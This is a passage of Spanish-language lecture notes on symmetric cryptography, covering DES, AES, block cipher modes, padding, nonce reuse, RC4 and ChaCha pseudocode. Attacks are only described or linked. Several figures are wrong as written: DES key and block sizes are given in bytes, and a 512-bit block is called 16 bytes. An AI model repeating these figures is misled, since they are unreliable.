intentos para recorrer el espacio completo de llaves, mientras que una de 32 bits necesitaría 4 mil millones de intentos. Hoy en día es considerada segura una llave de largo 128 o más.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-cifradores-de-bloque\"\u003eTipos de cifradores de bloque\u003c/h3\u003e\n\u003cp\u003eExisten muchos diseños de cifradores de bloque. A continuación mencionaremos algunos de los más conocidos y usados.\u003c/p\u003e\n\u003ch4 id=\"des\"\u003eDES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../des.png\" alt=\"Diagrama de especificación de DES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 1977\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 56 bytes (+ 8 de paridad)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 64 bytes\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 16\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eData Encryption Standard\u003c/strong\u003e es un algoritmo de cifrado simétrico creado por IBM en los 70s. Se publicó como estándar el año 1977, con el tamaño de llave que conocemos. Este tamaño de llave hace que sea completamente factible un ataque de fuerza bruta en unos días, contando con la capacidad computacional adecuada o pagando por un servicio especializado.\u003c/p\u003e\n\u003cp\u003ePueden encontrar una descripción bastante extensiva del algoritmo \u003ca href=\"https://en.wikipedia.org/wiki/Data_Encryption_Standard\"\u003een Wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eExiste una versión \u0026ldquo;fortificada\u0026rdquo; denominada \u003cstrong\u003e3DES\u003c/strong\u003e en la cual se aplica 3 veces el algoritmo DES a cada bloque, utilizando hasta 3 llaves ($K_1, K_2, K_3$) de 56 bits distintas, de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e$$C = E_{K_3}(D_{K_2}(E_{K_1}(P)))$$\n$$P = D_{K_1}(E_{K_2}(D_{K_3}(C)))$$\u003c/p\u003e\n\u003cp\u003eSin embargo, esta versión es considerada insegura por el NIST desde el año 2017 debido a la existencia de ataques de colisión, como SWEET32. Más información sobre esta versión pueden encontrarla en \u003ca href=\"https://en.wikipedia.org/wiki/Triple_DES\"\u003ela página de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch4 id=\"aes\"\u003eAES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../aes_rounds.jpg\" alt=\"Rondas AES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 2000\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 128, 192 o 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 128 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 10, 12 o 14\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAdvanced Encryption Standard\u003c/strong\u003e es el cifrador de bloque por defecto hoy en día. Dependiendo del tamaño de la llave, consiste en entre 10 y 14 rondas de operaciones de substitución y permutación, tal como se muestra en la figura anterior (obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e)\u003c/p\u003e\n\u003cp\u003ePara mayor información sobre la utilidad de cada ronda, se les recomienda revisar el libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e o la \u003ca href=\"https://es.wikipedia.org/wiki/AES\"\u003epágina de Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"modos-de-cifrado\"\u003eModos de Cifrado\u003c/h3\u003e\n\u003cp\u003eDebido a que los cifradores de bloque pueden encargarse de cifrar datos de tamaño igual al tamaño del bloque, es necesario definir estrategias que permitan cifrar información de un largo mucho mayor. Acá entran en juego los \u0026ldquo;modos de cifrado\u0026rdquo;, los cuales definen el algoritmo a usar para realizar el cifrado de la información completa.\u003c/p\u003e\n\u003cp\u003eEn todos los modos que se verán a continuación, se divide el texto completo en bloques de tamaño $BlockSize$. En caso que el texto completo no tenga un tamaño múltiplo de $BlockSize$, se agregan bytes al final de forma de rellenar (\u003cem\u003epadding\u003c/em\u003e) y obtener un texto plano de un tamaño adecuado. Lo anterior genera un problema cuando el texto ya tiene un tamaño múltiplo de $BlockSize$, por lo que en esos casos es necesario agregar un bloque completo, solo con padding.\u003c/p\u003e\n\u003cp\u003eAlgunos tipos de \u003cem\u003epadding\u003c/em\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eANSI X9.23\u003c/strong\u003e: Se rellena con bytes \u003ccode\u003e\\x00\u003c/code\u003e o algún byte al azar, salvo el último byte del bloque rellenado, que incluye como valor la cantidad de bytes usados para rellenar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePKCS7\u003c/strong\u003e: Se rellena con n bytes con el valor $hex(n)$, con $n \\in [1,BlockSize]$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ecb\"\u003eECB\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ecb_enc.png\" alt=\"Cifrado ECB\"\u003e\n\u003cimg src=\"../ecb_enc.png\" alt=\"Descifrado ECB\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eElectronic Codebook\u003c/strong\u003e es el modo de cifrado más simple. Cada bloque se cifra por separado usando siempre la misma llave, concatenándose todo para generar el texto cifrado.\u003c/p\u003e\n\u003ch5 id=\"filtración-de-información-estructural\"\u003eFiltración de información estructural\u003c/h5\u003e\n\u003cp\u003eSi bien este modo es muy fácil de implementar, el mayor problema que posee es que es fácil encontrar patrones en los mensajes si los datos cifrados tienen una estructura que se repite bastante. Un muy buen ejemplo de lo anterior es esta imagen del \u003ca href=\"https://isc.tamu.edu/~lewing/linux/\"\u003ePingüino Tux\u003c/a\u003e, la cual si cifrásemos bloques de ella usando AES/ECB, podríamos ver ciertos patrones con bloques de colores parecidos que delinearían los bordes del pingüino.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../tux.jpg\" alt=\"Tux\"\u003e\n\u003cimg src=\"../tux_ecb.jpg\" alt=\"Tux ECB\"\u003e\u003c/p\u003e\n\u003ch4 id=\"cbc\"\u003eCBC\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../cbc_enc.png\" alt=\"Cifrado CBC\"\u003e\n\u003cimg src=\"../cbc_enc.png\" alt=\"Descifrado CBC\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCipher Block Chaining\u003c/strong\u003e es un modo en el que el cifrado de cada bloque depende del resultado del cifrado del bloque anterior. Como caso especial, el primer bloque utiliza un valor público llamado \u003cem\u003eVector de Inicialización\u003c/em\u003e \u003ccode\u003e(IV)\u003c/code\u003e. Es importante que este valor sea aleatorio en cada sesión de cifrado, con el objetivo de impedir algunos tipos de ataques.\u003c/p\u003e\n\u003cp\u003eEl cambio anterior con respecto a ECB ayuda a que si ciframos exactamente la misma información en dos bloques distintos, el resultado cifrado no sea el mismo, evitando problemas como los vistos con la imagen del pingüino.\u003c/p\u003e\n\u003ch5 id=\"padding-oracle-attack\"\u003ePadding Oracle Attack\u003c/h5\u003e\n\u003cp\u003eSi contamos con feedback acerca del estado de un mensaje cifrado (específicamente, si el mensaje está bien formado o no), es posible ejecutar un ataque denominado \u003ca href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\"\u003ePadding Oracle Attack\u003c/a\u003e. En el curso \u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/anexos/padding-oracle/\"\u003eCC5312 Seguridad Computacional\u003c/a\u003e se explica cómo ejecutar este ataque.\u003c/p\u003e\n\u003ch5 id=\"maleabilidad-del-mensaje-cifrado-si-el-iv-no-cambia\"\u003eMaleabilidad del mensaje cifrado si el IV no cambia\u003c/h5\u003e\n\u003cp\u003eSi tanto el IV como la llave se mantienen en un servicio que permite elegir los mensajes a cifrar, es posible armar mensajes cifrados a medida sin necesidad de conocer la llave ni el IV. Veremos cómo hacer esto en las clases.\u003c/p\u003e\n\u003ch4 id=\"ctr\"\u003eCTR\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../ctr_enc.png\" alt=\"Cifrado CTR\"\u003e\n\u003cimg src=\"../ctr_enc.png\" alt=\"Descifrado CTR\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCounter Mode\u003c/strong\u003e es un modo que permite paralelizar el cifrado y descifrado de un mensaje, dado que la parte que pasa por el cifrador de bloque es un valor predeterminado y predecible. Además, el descifrado se ejecuta con el algoritmo de cifrado del cifrador de bloque elegido.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-flujo\"\u003eCifradores de Flujo\u003c/h2\u003e\n\u003cp\u003eLos cifradores de flujo intentan emular el uso de un cifrador de tipo \u003cstrong\u003eOne-Time Pad\u003c/strong\u003e, pero usando un generador de números \u003cstrong\u003epseudoaleatorio\u003c/strong\u003e. Estos generadores usan una semilla realmente aleatoria al inicializarse, la cual les permite generar una salida continua extensa que se comporta de forma similar a un flujo de datos realmente aleatoria. Posteriormente, es posible cifrar un stream de datos simplemente haciendo $XOR$ entre los datos y el flujo pseudoaleatorio. Con tal de que ambas partes conozcan la semilla, es posible asegurar la sincronización entre sus flujos aleatorios, con lo que se es posible comunicarse sin problemas y sin filtrar los mensajes.\u003c/p\u003e\n\u003ch3 id=\"el-_nonce_-en-los-cifradores-de-flujo\"\u003eEl \u003cem\u003enonce\u003c/em\u003e en los cifradores de flujo\u003c/h3\u003e\n\u003cp\u003ePartamos mencionando una potencial vulnerabilidad de los cifradores de flujo. Si se usa dos veces el mismo flujo pseudoaleatorio para dos conjuntos de datos (a partir del uso de la misma semilla), y luego se ejecuta la operación $XOR$ entre ambos textos cifrados, se obtendrá como resultado lo siguiente:\u003c/p\u003e\n\u003cp\u003e$$E(P_1) = P_1 \\oplus S$$\n$$E(P_2) = P_2 \\oplus S$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus S) \\oplus (P_2 \\oplus S)$$\n$$E(P_1) \\oplus E(P_2) = (P_1 \\oplus P_2)$$\u003c/p\u003e\n\u003cp\u003eAsumiendo que el texto plano tiene cierta estructura, luego no es difícil deducir qué valores corresponden a $P_1$ y $P_2$ a partir de $E(P_1) \\oplus E(P_2)$.\u003c/p\u003e\n\u003cp\u003ePara evitar el problema anterior, los cifradores de flujo suelen recibir un parámetro extra, denominado \u003cem\u003enonce\u003c/em\u003e. Este campo puede ser considerado como público sin que esto signifique disminuir la seguridad del cifrador, pero \u003cstrong\u003edebe ser distinto\u003c/strong\u003e en cada ejecución del algoritmo, por lo que en algunas implementaciones corresponde simplemente a un contador que se incrementa en cada uso del cifrador. En caso que el nonce no siga una generación predecible, es necesario compartirlo entre ambas partes que desean comunicarse.\u003c/p\u003e\n\u003ch3 id=\"rc4\"\u003eRC4\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../rc4.png\" alt=\"Generación Aleatoriedad RC4\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e: Entre 40 y 2048 bits.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e: No lleva de forma oficial, aunque se suele agregar como parte de la llave.\u003c/p\u003e\n\u003cp\u003eTambién conocido como \u003cstrong\u003eARCFOUR\u003c/strong\u003e, es un cifrador de flujo diseñado el año 1987 pero filtrado el año 1994. Se comenzó a utilizar como un producto propietario de RSA Security, hasta que en el año 1994 se filtró su especificación en un foro cypherpunk.\u003c/p\u003e\n\u003cp\u003eAl hacerse público su funcionamiento, se empezaron a encontrar varios errores y vulnerabilidades en el algoritmo. Un ejemplo de estos problemas es que los primeros bytes de salida del generador pseudoaleatorio permiten adivinar el estado interno del mismo, derivándose así información sobre la clave.\u003c/p\u003e\n\u003cp\u003eSi bien su diseño no considera el uso de un nonce, éste se suele agregar de alguna de las formas siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHasheando la semilla y el nonce y usando el valor hasheado como semilla. Esta es la forma recomendada.\u003c/li\u003e\n\u003cli\u003eConcatenando la semilla con el nonce. Sin embargo, esto puede traer problemas de aleatoriedad debido a fallas propias de RC4.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEs posible encontrar más información sobre este cifrador (y sus problemas) \u003ca href=\"https://en.wikipedia.org/wiki/RC4\"\u003een wikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"chacha\"\u003eChaCha\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../chacha.png\" alt=\"Ronda Chacha\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño de llave\u003c/strong\u003e 256 bits\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTamaño del Nonce\u003c/strong\u003e 64 bits\u003c/p\u003e\n\u003cp\u003eChaCha es una familia de cifradores de flujo basada en una variante de Salsa20. Estos cifradores definen un estado inicial compuesto por \u0026ldquo;palabras\u0026rdquo; de 32 bit dispuestas en una matriz de 4x4:\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e(00) \u003ccode\u003eexpa\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(01) \u003ccode\u003end 3\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(02) \u003ccode\u003e2-by\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(03) \u003ccode\u003ete k\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(04) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(05) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(06) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(07) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(08) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(09) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(10) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(11) \u003ccode\u003e K\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(12) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(13) \u003ccode\u003e P\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(14) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e(15) \u003ccode\u003e N\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eDonde:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e(XX) representa el número del byte (se usa más abajo)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexpand 32-byte k\u003c/code\u003e es un texto en ASCII de 16 caracteres (4 \u003ccode\u003ewords\u003c/code\u003e de 32 bits)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eK\u003c/code\u003e es la llave dividida en 8 bloques de 32 bits cada uno\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eP\u003c/code\u003e (posición) es un contador que lleva cuenta de la cantidad de bloques cifrados.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eN\u003c/code\u003e corresponde a un \u003cem\u003enonce\u003c/em\u003e, es decir, un valor que no debe repetirse entre usos del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSi bien el cifrado es de tipo \u0026ldquo;flujo\u0026rdquo;, los bytes de éste se generan de a bloques de tamaño 512 bits (16 bytes). Para generar el bloque de número $i$, se ejecutan los siguientes pasos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe setean los bytes $P$ del estado \u003ccode\u003earr\u003c/code\u003e en el valor binario de $i$\u003c/li\u003e\n\u003cli\u003eSe ejecuta 10 veces la siguiente operación en pseudocódigo (denominada \u0026ldquo;doble ronda\u0026rdquo;) sobre el estado:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"n\"\u003efunc\u003c/span\u003e \u003cspan class=\"n\"\u003edouble_round\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAcá \u003ccode\u003eQR\u003c/code\u003e o \u003cem\u003e\u0026ldquo;Quarter Round\u0026rdquo;\u003c/em\u003e se define de la siguiente forma:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eQR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eY \u003ccode\u003ex \u0026lt;\u0026lt;\u0026lt;= y\u003c/code\u003e corresponde a una \u0026ldquo;rotación de y bits al valor x\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003eFinalmente, los valores correspondientes al estado luego de correr 10 veces la \u003cem\u003edouble round\u003c/em\u003e son XOReados con los datos, devolviendo el valor cifrado.\u003c/p\u003e\n\u003cp\u003eEl descifrado se ejecuta de la misma forma, dado que XOR es una operación que se cancela a sí misma al ejecutarse dos veces sobre el mismo texto.\u003c/p\u003e\n\u003ch2 id=\"más-allá-del-cifrado\"\u003eMás allá del cifrado\u003c/h2\u003e\n\u003cp\u003eMuchas veces, el cifrado no es suficiente para asegurar que una comunicación entre dos partes ocurre de forma segura. Un ejemplo: Si un mensaje cifrado no contiene metainformación acerca de cuándo fue mandado, un atacante podría reenviar mensajes de una persona a la otra, haciéndola pensar que se dijo nuevamente algo que en verdad no se dijo. Este ataque se denomina \u003ccode\u003eAtaque de Repetición\u003c/code\u003e (o Replay Attack), y se puede evitar agregando información secuencial al mensaje (por ejemplo, un contador monótono para cada participante).\u003c/p\u003e\n\u003cp\u003eOtro problema que puede ocurrir frente a una comunicación cifrada es que el mensaje sea alterado por un atacante antes de llegar al receptor. En el caso del cifrado de flujo, donde la modificación de un byte del texto 